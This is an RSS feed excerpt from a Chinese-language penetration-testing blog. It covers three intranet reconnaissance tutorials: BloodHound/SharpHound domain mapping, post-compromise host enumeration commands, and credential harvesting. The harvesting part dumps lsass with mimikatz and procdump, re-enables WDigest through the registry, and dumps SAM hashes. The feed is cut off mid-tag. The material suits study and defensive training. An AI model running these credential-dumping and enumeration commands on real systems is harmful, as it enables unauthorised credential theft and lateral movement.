<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>内网信息搜集 on Yuy0ung的知识库</title>
    <link>https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</link>
    <description>Recent content in 内网信息搜集 on Yuy0ung的知识库</description>
    <generator>Hugo</generator>
    <language>en-US</language>
    <lastBuildDate>Thu, 11 Dec 2025 00:00:00 +0800</lastBuildDate>
    <atom:link href="https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>内网信息收集-BloodHound分析域环境</title>
      <link>https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-bloodhound%E5%88%86%E6%9E%90%E5%9F%9F%E7%8E%AF%E5%A2%83/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-bloodhound%E5%88%86%E6%9E%90%E5%9F%9F%E7%8E%AF%E5%A2%83/</guid>
      <description>&lt;h1 id=&#34;内网信息收集-bloodhound分析域环境&#34;&gt;内网信息收集-BloodHound分析域环境&lt;/h1&gt;&#xA;&lt;p&gt;bloodhound是一款单页JavaScript Web应用程序，是一款强大的域内环境分析工具，能通过图与线的形式将域内相关用户、组、计算机、会话、ACL等对象之间的关系以可视化方式呈现，我们可以利用它来识别高度复杂的攻击路径&lt;/p&gt;&#xA;&lt;h3 id=&#34;bloodhound的安装&#34;&gt;bloodhound的安装&lt;/h3&gt;&#xA;&lt;p&gt;这里我在windows上进行安装&lt;/p&gt;&#xA;&lt;h4 id=&#34;安装neo4j数据库&#34;&gt;安装neo4j数据库&lt;/h4&gt;&#xA;&lt;p&gt;这里我在windows上安装&lt;a href=&#34;https://neo4j.com/deployment-center/#community&#34;&gt;Neo4j Deployment Center - Graph Database &amp;amp; Analytics&lt;/a&gt;：&lt;/p&gt;&#xA;&lt;p&gt;下载好，解压，直接执行命令启动：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;neo4j.bat console&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;只要jdk版本正确，就能够正常启动&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240912194620799-2847468.png&#34; alt=&#34;image-20240912194617110&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;然后浏览器访问并登录：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host : http://localhost:7474&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Username : neo4j&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Password : neo4j&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240912194733441-1009721940.png&#34; alt=&#34;image-20240912194730170&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;修改默认密码：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240912194847851-77755018.png&#34; alt=&#34;image-20240912194844553&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;neo4j就安装完毕了&lt;/p&gt;&#xA;&lt;h4 id=&#34;运行bloodhound&#34;&gt;运行bloodhound&lt;/h4&gt;&#xA;&lt;p&gt;下载&lt;a href=&#34;https://github.com/BloodHoundAD/BloodHound/releases/tag/v4.3.1&#34;&gt;bloodhound&lt;/a&gt;，解压后直接启动exe，并用noe4j的账号密码登录：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240912202651065-344837007.png&#34; alt=&#34;image-20240912202647846&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;进入后页面左上角有三个选项卡：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;database info（数据库信息）&lt;/li&gt;&#xA;&lt;li&gt;node info（节点信息）&lt;/li&gt;&#xA;&lt;li&gt;analysis（分析）&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;右上角有很多设置选项，这里不细说&lt;/p&gt;&#xA;&lt;h2 id=&#34;活动目录信息收集&#34;&gt;活动目录信息收集&lt;/h2&gt;&#xA;&lt;p&gt;收集工具使用sharphound（这里用1.x的版本）&lt;/p&gt;&#xA;&lt;p&gt;有两种收集方案：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;powershell采集脚本：SharpHound.ps1&lt;/li&gt;&#xA;&lt;li&gt;可执行文件：SharpHound.exe&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;命令如下&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SharpHound.exe -c all&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;powershell -exec bypass -command &lt;span class=&#34;s2&#34;&gt;&amp;#34;Import-Module ./SharpHound.ps1; Invoke-BloodHound -c all&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;两种方法都需要将文件上传至目标主机，我这里使用exe进行收集：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240912202835827-1153010778.png&#34; alt=&#34;image-20240912202832487&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;会在当前目录生成格式为“时间戳_BloodHound.zip”的文件&lt;/p&gt;&#xA;&lt;h4 id=&#34;导入数据&#34;&gt;导入数据&lt;/h4&gt;&#xA;&lt;p&gt;直接压缩包拖动导入即可：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240912202959336-1395861449.png&#34; alt=&#34;image-20240912202956302&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;上传后左上角的database info处就有数据了，此时进入analysis模块，选择不同的查询条件，可以进行不同的分析查询，比如“find all domain admins”：&lt;/p&gt;</description>
    </item>
    <item>
      <title>内网信息收集-基础收集</title>
      <link>https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%9F%BA%E7%A1%80%E6%94%B6%E9%9B%86/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E5%9F%BA%E7%A1%80%E6%94%B6%E9%9B%86/</guid>
      <description>&lt;h1 id=&#34;内网信息收集-基础收集&#34;&gt;内网信息收集-基础收集&lt;/h1&gt;&#xA;&lt;p&gt;主要有：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;本机基础信息收集&lt;/li&gt;&#xA;&lt;li&gt;域内信息收集&lt;/li&gt;&#xA;&lt;li&gt;基于powershell的收集&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;本机基础信息收集&#34;&gt;本机基础信息收集&lt;/h3&gt;&#xA;&lt;p&gt;在getshell后，首先就是以当前主机为中心进行信息收集&lt;/p&gt;&#xA;&lt;h5 id=&#34;查看当前用户权限&#34;&gt;查看当前用户权限&lt;/h5&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;whoami /all&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以查看当前用户所处的用户组、拥有的特权等，用于综合判断是否需要提权&lt;/p&gt;&#xA;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240904171544811-1902090448.png&#34; alt=&#34;image-20240904171540744&#34; style=&#34;zoom:80%;&#34; /&gt;&#xA;&lt;h5 id=&#34;查看网络配置信息&#34;&gt;查看网络配置信息&lt;/h5&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ipconfig /all&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看当前主机网络配置情况，包括主机的IP地址、主机名、各网络适配器的信息等，可以判断主机所在网段&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240904211538528-590980460.png&#34; alt=&#34;image-20240904211535685&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;值得一提的是Ethernet0中的DNS服务器地址，搭建过域环境便知道，DNS服务器的IP地址通常就为域控制器的地址&lt;/p&gt;&#xA;&lt;h5 id=&#34;查看主机路由信息&#34;&gt;查看主机路由信息&lt;/h5&gt;&#xA;&lt;p&gt;查看主机路由表：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;route print&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240905173329447-479756763.png&#34; alt=&#34;image-20240905173328054&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;路由表中的“网络目标”都是主机可以访问到的，后续可以对其中的网段进行探测&lt;/p&gt;&#xA;&lt;h5 id=&#34;查看操作系统信息&#34;&gt;查看操作系统信息&lt;/h5&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systeminfo&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看操作系统信息，包括主机名、操作系统版本、系统目录、所处的域或工作组、网卡信息、安装的补丁&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240905200520098-14600135.png&#34; alt=&#34;image-20240905200518883&#34;&gt;&lt;/p&gt;&#xA;&lt;h5 id=&#34;查看端口连接信息&#34;&gt;查看端口连接信息&lt;/h5&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;netstat -ano&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看主机的TCP、UDP端口的监听和开放情况，内网其他主机访问本机时也会建立连接，所以也能用来收集内网地址段&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240905200747300-1962870028.png&#34; alt=&#34;image-20240905200746678&#34;&gt;&lt;/p&gt;&#xA;&lt;h5 id=&#34;查看当前会话列表&#34;&gt;查看当前会话列表&lt;/h5&gt;&#xA;&lt;p&gt;查看当前主机与所连接的客户机之间的会话&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net session&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240905201803000-1198375372.png&#34; alt=&#34;image-20240905201802239&#34;&gt;&lt;/p&gt;&#xA;&lt;h5 id=&#34;查看当前网络共享信息&#34;&gt;查看当前网络共享信息&lt;/h5&gt;&#xA;&lt;p&gt;查看主机开启的共享列表：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net share&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240905201847579-290315823.png&#34; alt=&#34;image-20240905201847023&#34;&gt;&lt;/p&gt;&#xA;&lt;h5 id=&#34;查看已连接的网络共享&#34;&gt;查看已连接的网络共享&lt;/h5&gt;&#xA;&lt;p&gt;查看主机与其他主机远程建立的网络共享连接&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net use&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240905202004336-902598743.png&#34; alt=&#34;image-20240905202003479&#34;&gt;&lt;/p&gt;&#xA;&lt;h5 id=&#34;查看当前进程信息&#34;&gt;查看当前进程信息&lt;/h5&gt;&#xA;&lt;p&gt;查看当前主机所有进程信息&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tasklist&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240905202247200-1448880569.png&#34; alt=&#34;image-20240905202246396&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以针对进程信息进行杀软识别&lt;/p&gt;&#xA;&lt;p&gt;也可以用WMIC:&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wmic process get name, ProcessID, ExecutablePath&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240905203118786-2141018018.png&#34; alt=&#34;image-20240905203117602&#34;&gt;&lt;/p&gt;&#xA;&lt;h5 id=&#34;查看当前服务信息&#34;&gt;查看当前服务信息&lt;/h5&gt;&#xA;&lt;p&gt;查看当前所有服务信息，过滤出服务名称、路径、创建时间、运行状态信息&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wmic service get Caption,Name,PathName,StartName,State&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240905205836892-1874655405.png&#34; alt=&#34;image-20240905205835928&#34;&gt;&lt;/p&gt;&#xA;&lt;h5 id=&#34;查看计划任务信息&#34;&gt;查看计划任务信息&lt;/h5&gt;&#xA;&lt;p&gt;查看主机上所有的计划任务：&lt;/p&gt;</description>
    </item>
    <item>
      <title>内网信息收集-用户凭据收集</title>
      <link>https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE%E6%94%B6%E9%9B%86/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E7%94%A8%E6%88%B7%E5%87%AD%E6%8D%AE%E6%94%B6%E9%9B%86/</guid>
      <description>&lt;h1 id=&#34;内网信息收集-用户凭据收集&#34;&gt;内网信息收集-用户凭据收集&lt;/h1&gt;&#xA;&lt;p&gt;这是内网渗透中很重要的一步，很多操作都需要用户凭据&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;注：这里的收集大多需要管理员权限，所以需要配合权限提升&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;获取域内单机密码和哈希&#34;&gt;获取域内单机密码和哈希&lt;/h3&gt;&#xA;&lt;p&gt;在前面介绍NTLM协议时介绍过windows的NTLM本地认证流程，&lt;a href=&#34;https://yuy0ung.github.io/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/windows%E5%8D%8F%E8%AE%AE/windows%E5%8D%8F%E8%AE%AE%E4%B9%8Bntlm/&#34;&gt;Windows协议之NTLM&lt;/a&gt;：&lt;/p&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;在用户输入密码进行身份验证的过程中，所有操作都是在本地进行的。系统将用户输入的密码转换为NTLM Hash，再将其与SAM中的NTLM  Hash文件进行比较，若相同则说明密码正确，反之则为错误。当用户注销、重启、锁屏后，操作系统会让winlog.exe显示登陆界面，即密码输入框，在winlog.exe程序接收到输入之后，会将密码交给lsass.exe进程，lsass.exe进程中会存储一份明文密码，并将其加密成NTLM Hash，与SAM数据库进行比较和认证&lt;/p&gt;&#xA;&lt;p&gt;在上述过程中，有个lsass.exe进程，我们在渗透过程中使用的Mimikatz就是从该进程中抓取的明文或Hash密码&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;这里详细记录在如何使用mimikatz进行信息收集：&lt;/p&gt;&#xA;&lt;h4 id=&#34;在线读取lsass进程&#34;&gt;在线读取lsass进程&lt;/h4&gt;&#xA;&lt;p&gt;将mimikatz上传至目标主机后，命令行启动：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mimikatz.exe &lt;span class=&#34;s2&#34;&gt;&amp;#34;privilege::debug&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;sekurlsa::logonpasswords full&amp;#34;&lt;/span&gt; exit&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# &lt;span class=&#34;s2&#34;&gt;&amp;#34;privilege::debug&amp;#34;&lt;/span&gt;用于提升至DebugPrivilege权限(需要管理员权限)&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# &lt;span class=&#34;s2&#34;&gt;&amp;#34;sekurlsa::logonpasswords full&amp;#34;&lt;/span&gt;用于导出用户凭据&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240909172025636-1421765142.png&#34; alt=&#34;image-20240909172020826&#34; style=&#34;zoom: 65%;&#34; /&gt;&#xA;&lt;p&gt;比如这里抓取到NTLM hash，尝试解密：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240909172109816-425995576.png&#34; alt=&#34;image-20240909172105962&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;即可获得明文密码&lt;/p&gt;&#xA;&lt;h4 id=&#34;离线读取lsass内存文件&#34;&gt;离线读取lsass内存文件&lt;/h4&gt;&#xA;&lt;p&gt;也可以将lsass的进程内存转储，导出到本地后使用mimikatz离线读取&lt;/p&gt;&#xA;&lt;p&gt;这里选择微软官方的&lt;a href=&#34;https://learn.microsoft.com/zh-cn/sysinternals/downloads/procdump&#34;&gt;ProcDump&lt;/a&gt;进行内存转储，首先将procdump上传至目标主机，命令行启动：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;procdump.exe -accepteula -ma lsass.exe lsass.dmp&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240909173233975-1004716007.png&#34; alt=&#34;image-20240909173229329&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来将lsass.dmp放到本地离线读取：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mimikatz.exe &lt;span class=&#34;s2&#34;&gt;&amp;#34;sekurlsa::minidump lsass.dmp&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;sekurlsa::logonpasswords full&amp;#34;&lt;/span&gt; exit&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# &lt;span class=&#34;s2&#34;&gt;&amp;#34;sekurlsa::minidump lsass.dmp&amp;#34;&lt;/span&gt;用于加载内存文件&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# &lt;span class=&#34;s2&#34;&gt;&amp;#34;sekurlsa::logonpasswords full&amp;#34;&lt;/span&gt;用于导出用户凭据&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240909174135886-1521910596.png&#34; alt=&#34;image-20240909174130281&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在上面的抓取过程中可以看见，wdigest功能中抓取不到明文密码，因为微软在2014年5月发布了补丁，关闭了wdigest功能，禁止从内存中获取明文密码，且windows server 2012及以上版本默认关闭了wdigest功能&lt;/p&gt;&#xA;&lt;p&gt;可以通过修改注册表，可以重新开启wdigest功能：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# 开启wdigest&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240909185205467-399349038.png&#34; alt=&#34;image-20240909185200986&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;在开启wdigest后，若主机再次触发本地认证操作（比如睡眠后重新登录），则可抓取明文密码：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240909185437443-1017843386.png&#34; alt=&#34;image-20240909185433291&#34;&gt;&lt;/p&gt;&#xA;&lt;h4 id=&#34;在线读取sam文件&#34;&gt;在线读取SAM文件&lt;/h4&gt;&#xA;&lt;p&gt;读取SAM文件中保存的用户登录凭据，可以导出当前系统中所有本地用户的hash：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mimikatz.exe &lt;span class=&#34;s2&#34;&gt;&amp;#34;privilege::debug&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;token::elevate&amp;#34;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;lsadump::sam&amp;#34;&lt;/span&gt; exit&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# &lt;span class=&#34;s2&#34;&gt;&amp;#34;privilege::debug&amp;#34;&lt;/span&gt;用于提升至DebugPrivilege权限&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# &lt;span class=&#34;s2&#34;&gt;&amp;#34;token::elevate&amp;#34;&lt;/span&gt;用于提升至SYSTEM权限&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# &lt;span class=&#34;s2&#34;&gt;&amp;#34;lsadump::sam&amp;#34;&lt;/span&gt;用于读取本地SAM文件&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20240910193428223-1518041637.png&#34; 